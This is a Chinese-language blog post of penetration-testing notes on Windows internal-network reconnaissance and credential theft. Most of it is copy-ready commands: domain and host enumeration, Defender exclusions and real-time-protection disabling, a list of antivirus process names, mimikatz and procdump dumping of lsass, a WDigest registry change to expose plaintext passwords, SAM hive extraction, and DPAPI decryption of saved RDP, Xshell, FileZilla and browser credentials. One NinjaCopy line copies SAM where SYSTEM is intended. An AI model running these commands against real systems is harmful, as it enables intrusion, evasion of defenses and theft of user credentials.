---
title: 内网信息收集
published: 2026-05-01
pubDate: 2026-05-01
description: 内网安全 zsm
pinned: false
tags: ["内网安全"]
author: zsm
category: 渗透
draft: false 
licenseName: "MIT"
lang: 'zh_CN'
---

## 前言

这里直说win的了，linux的感觉没必要（

这里先说手动挡的，下面写工具

这里是看Yuy0ung师傅的博客学习的

## 基础信息收集

`用户权限`

>whoami /all

`基础网络配置`

>ipconfig /all

`路由信息`

>route print

`查看操作系统信息`

>systeminfo

`看端口连接`

>netstat -ano

`查看当前主机与所连接的客户机之间的会话`

>net session

`查看主机开启的共享列表`

>net share

`查看主机与其他主机远程建立的网络共享连接`

>net use

`查看当前主机所有进程信息`

>tasklist

`查看主机上所有的计划任务`

>schtasks /query /v /fo list

`查看自启程序信息`

>wmic startup get Caption,Command,Location,User

`查看本地用户/组信息`

>net user
net localgroup administrators

`查看当前登录用户`

>query user

`是否存在域环境`

>net config workstation

`查看所有域用户`

>net user /domain

`列出域内所有用户组`

>net group /domain

`查看域控列表`

>net group "Domain Controllers" /domain

`查看主DC`

>net time /domain

`查询主机所在域和其他域的信任关系`

>nltest /domain_trusts

`发现内网存活主机`

>for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.111.%I | findstr "TTL="
nbtscan.exe 192.168.111.0/24
unicornscan.exe -mU 192.168.111.0/24
arp-scan.exe -t 192.168.111.0/24
crackmapexec smb 192.168.111.0/24

`内网端口扫描`

>telnet 192.168.111.132 445
nmap -sV -p- 192.168.111.132
msf探测内网

`获取端口banner`

>nc -nv 192.168.111.132 135
nmap --script=banner -p 3389 192.168.111.132

`查看系统版本号`

>ver

`架构信息`

>wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%

`服务信息`

>sc query state=all
wmic service list brief
ps:Get-wmiObject win32_service | select Name,PathName

`驱动信息`

>driverquery

`磁盘信息`

>wmic logicaldisk get caption,description,providername
tree D:\ >E:\Desktop\tree.txt
dir /s D:\ >E:\Desktop\tree.txt

`防火墙状态`

>netsh advfirewall show allprofiles

使用powershell命令列出防火墙阻止的所有端口

>$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq "0"} | select name,applicationname,localports

`windows defender状态`

>Get-MpComputerStatus

powershell cmdet添加检查排除项（需要管理员权限执行）

>Add-MpPreference -ExclusionPath "C:\Temp"	#排除文件夹
Set-MpPreference -ExclusionProcess "beacon.exe"	#排除某进程

powershell cmdet关闭windows defender实时保护（需要管理员权限执行，且已关闭篡改防护)

>Set-MpPreference -DisableRealtimeMonitoring $true

常见的防护软件进程
+ 360系列：360tray.exe/360safe.exe/ZhuDongFangYu.exe/360sd.exe
+ QQ电脑管家：QQPCRTP.exe
+ Avira（小红伞）：avcenter.exe/avguard.exe/avgnt.exe/sched.exe
+ 安全狗：SafeDogGuardCenter.exe等带有safedog字符的进程
+ D盾：D_Safe_Manage.exe/d_manage.exe
+ 火绒：hipstray.exe/wsctrl.exe/usysdiag.exe
+ 卡巴斯基：avp.exe
+ Mcafee：Mcshield.exe/Tbmom.exe/Frameworkservice.exe
+ ESET NOD32：egui.exe/ekrn.exe/eguiProxy.exe
+ 赛门铁克：ccSetMgr.exe
+ 趋势杀毒：TMBMSRV.exe
+ 瑞星杀毒：RavMonD.exe


## 用户凭据收集

### 在线读取lsass进程

先把mimikatz传上去，然后shell启动

>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit
#"privilege::debug"用于提升至DebugPrivilege权限(需要管理员权限)
#"sekurlsa::logonpasswords full"用于导出用户凭据

可能抓到`NTLM hash`什么的，丢在线网站解密就行了

### 离线读取lsass内存文件

可以将lsass的进程内存转储，导出到本地后使用mimikatz离线读取

这里选择微软官方的[ProcDump](https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump)进行内存转储，首先将procdump上传至目标主机，然后启动

>procdump.exe -accepteula -ma lsass.exe lsass.dmp

接下来将lsass.dmp放到本地离线读取

>mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords full" exit

procdump还有mac版本，不赖😋

微软在2014年5月发布了补丁，关闭了wdigest功能，禁止从内存中获取明文密码，且windows server 2012及以上版本默认关闭了wdigest功能

可以通过修改注册表，可以重新开启wdigest功能

>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f

在开启wdigest后，若主机再次触发本地认证操作（比如睡眠后重新登录），则可抓取明文密码

### 在线读取SAM文件

读取SAM文件中保存的用户登录凭据，可以导出当前系统中所有本地用户的hash

>mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" exit
#"privilege::debug"用于提升至DebugPrivilege权限
#"token::elevate"用于提升至SYSTEM权限
#"lsadump::sam"用于读取本地SAM文件

### 离线读取本地SAM文件

将SAM文件导出并使用mimikatz加载并读取其中的用户登录凭据等信息，但微软为了提高SAM文件安全性，会对SAM文件使用密钥加密，该密钥存储于于SAM同目录下的SYSTEM文件中

那么首先需要导出SYSTEM和SAM文件，但这两个文件是被锁定的，所以需要借助工具实现，这里使用powersploit中的invoke-NinjaCopy.ps1

但powershell的默认执行策略为Restricted（受限）先改策略

>Set-ExecutionPolicy Unrestricted

导入ps脚本

>Import-Module .\Invoke-NinjaCopy.ps1

然后导出SAM和SYSTEM文件

>Invoke-NinjaCopy -Path "C:\windows\System32\config\SAM" -LocalDestination C:\Temp\SAM
Invoke-NinjaCopy -Path "C:\windows\System32\config\SAM" -LocalDestination C:\Temp\SYSTEM

同时：CVE-2021-36934可以提权直接读取SAM和SYSTEM文件，在具有管理员权限的情况下，可以直接通过保存注册表的形式导出

>reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive

然后mimikatz解析

>mimikatz.exe "lsadump::sam /sam:sam.hive /system:system.hive" exit

### 获取RDP保存的凭据

若用户在RDP登陆时，勾选了保存连接凭证，凭据便会使用数据保护API以加密的形式存储在windows的凭据管理器中，路径为`%USERPROFILE%\AppData\Local\Microsoft\Credentials`

查看当前主机保存的所有连接凭证

>cmdkey /list

遍历Credentials中保存的凭据

>dir /a %USERPROFILE%\AppData\Local\Microsoft\Credentials\*

mimikatz解析该凭证

>mimikatz.exe "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\凭证" exit

其中pbData就是凭据的加密数据，guidMasterKey是该凭据的GUID，这里记住guidMasterKey:A

>mimikatz.exe "privilege::debug" "sekurlsa::dpapi" exit

这里可以找到和guidMasterKey相关的MasterKey:B

接下来用拿到的MasterKey执行命令

>mimikatz.exe "privilege::debug" "dpapi::cred /in:%USERPROFILE%\AppData\Local\Microsoft\Credentials\A /masterkey:B" exit

然后就可以了

### 获取Xshell保存的凭据

用这个工具[SharpXDecrypt](https://github.com/JDArmy/SharpXDecrypt)

Xshell会将服务器连接信息保存在session目录下的.xsh文件中


![image](./attachments/260501-161730.avif)

如果用户连接时勾选了记住用户名/密码，那么该文件会保存远程服务器连接的用户名和加密后的密码

>.\SharpXDecrypt.exe

就会跑出来

### 获取FileZilla&NaviCat保存的凭据

通用工具[SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd)

>SharpDecryptPwd.exe -FileZilla
SharpDecryptPwd.exe -NavicatCrypto

### 获取浏览器保存的凭据


web浏览器有保存密码的功能

可以使用[hackbrowserdata](https://github.com/moonD4rk/HackBrowserData)获取密码等信息

## BloodHound

安装的话用手册上面的流程很快，[链接](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart)


![image](./attachments/260501-172524.avif)

整个五分钟就搭建完了，具体都是干什么的我感觉直接看官方手册比较好

### 活动目录信息收集

工具用`sharphound`

有两种收集方案：
+ powershell采集脚本：SharpHound.ps1
+ 可执行文件：SharpHound.exe

命令很简单

>SharpHound.exe -c all
powershell -exec bypass -command "Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all"

收集到的压缩包直接导入进去就行了，然后自己去搜索自己想要的

此时单击任意节点，右侧会显示信息


![image](./attachments/260501-173244.avif)

边缘（Edge）是连接两个节点的连线，可以反映两个相互作用的节点之间的关系

这个看文档吧

后面还有一些数据分析的内容，手册里面也有
